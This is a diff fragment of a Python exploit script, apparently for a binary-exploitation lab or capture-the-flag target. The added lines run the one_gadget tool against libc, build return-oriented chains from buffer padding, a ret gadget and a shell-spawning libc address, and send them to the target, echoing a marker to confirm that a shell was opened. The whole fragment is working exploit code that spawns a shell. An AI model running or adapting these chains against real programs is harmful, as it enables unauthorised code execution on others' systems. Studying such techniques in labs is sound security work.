@@ -56,6 +56,20 @@ for OFF in OFF_CANDS:
             if MARK in run(inp):
                 print("VERIFIED off=%d leak=%#x base=%#x system=%#x" % (OFF, leak, base, system))
                 sys.exit(0)
+        # fallback: one_gadget (single magic libc address that spawns a shell)
+        try:
+            import subprocess as _sp
+            ogs = [int(x, 0) for x in _sp.run(["one_gadget", "--raw", libc.path],
+                   capture_output=True, text=True, timeout=30).stdout.split()]
+        except Exception:
+            ogs = []
+        for og in ogs:
+            for a2 in (0, 1):
+                chain = b"A" * OFF + p64(ret) * a2 + p64(base + og)
+                inp = chain.ljust(READSZ, b"A") + b"\n echo " + MARK + b"\n"
+                if MARK in run(inp):
+                    print("VERIFIED off=%d one_gadget=%#x base=%#x" % (OFF, base + og, base))
+                    sys.exit(0)
 print("NOT_VERIFIED")
 sys.exit(1)
 '''
